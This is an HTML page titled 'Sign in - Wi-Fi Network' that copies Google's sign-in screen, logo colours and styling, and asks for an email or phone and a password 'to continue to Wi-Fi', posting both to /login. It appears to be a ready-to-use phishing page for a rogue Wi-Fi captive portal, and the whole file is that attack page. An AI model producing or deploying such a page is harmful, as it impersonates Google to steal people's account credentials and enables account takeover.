<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in - Wi-Fi Network</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Google Sans','Segoe UI',Roboto,sans-serif;background:#f8f9fa;
display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:8px;padding:48px 40px 36px;width:100%;
max-width:450px;box-shadow:0 1px 3px rgba(0,0,0,.1),0 1px 2px rgba(0,0,0,.06);
border:1px solid #dadce0}
.glogo{text-align:center;margin-bottom:16px;font-size:1.8em;font-weight:500}
.glogo span{color:#4285f4}.glogo .o1{color:#ea4335}.glogo .o2{color:#fbbc05}
.glogo .g2{color:#34a853}.glogo .l{color:#4285f4}.glogo .e{color:#ea4335}
h1{text-align:center;font-size:1.3em;font-weight:400;color:#202124;margin-bottom:4px}
p.desc{text-align:center;font-size:.87em;color:#5f6368;margin-bottom:28px}
.field{position:relative;margin-bottom:20px}
.field input{width:100%;padding:13px 14px;border:1px solid #dadce0;
border-radius:4px;font-size:.95em;outline:none;color:#202124}
.field input:focus{border:2px solid #1a73e8;padding:12px 13px}
.field label{position:absolute;top:-8px;left:10px;background:#fff;
padding:0 4px;font-size:.75em;color:#5f6368}
button{width:100%;padding:10px 24px;background:#1a73e8;color:#fff;
border:none;border-radius:4px;font-size:.9em;font-weight:500;
cursor:pointer;margin-top:8px}
button:hover{background:#1765cc;box-shadow:0 1px 3px rgba(26,115,232,.4)}
.help{text-align:center;margin-top:20px}
.help a{color:#1a73e8;text-decoration:none;font-size:.82em}
</style>
</head>
<body>
<div class="card">
<div class="glogo">
<span>G</span><span class="o1">o</span><span class="o2">o</span><span>g</span><span class="g2">l</span><span class="e">e</span>
</div>
<h1>Sign in</h1>
<p class="desc">to continue to Wi-Fi</p>
<form method="POST" action="/login">
<div class="field">
<label for="email">Email or phone</label>
<input type="text" id="email" name="username" required autocomplete="off">
</div>
<div class="field">
<label for="pass">Password</label>
<input type="password" id="pass" name="password" required>
</div>
<button type="submit">Next</button>
</form>
<div class="help">
<a href="#">Forgot password?</a>
</div>
</div>
</body>
</html>
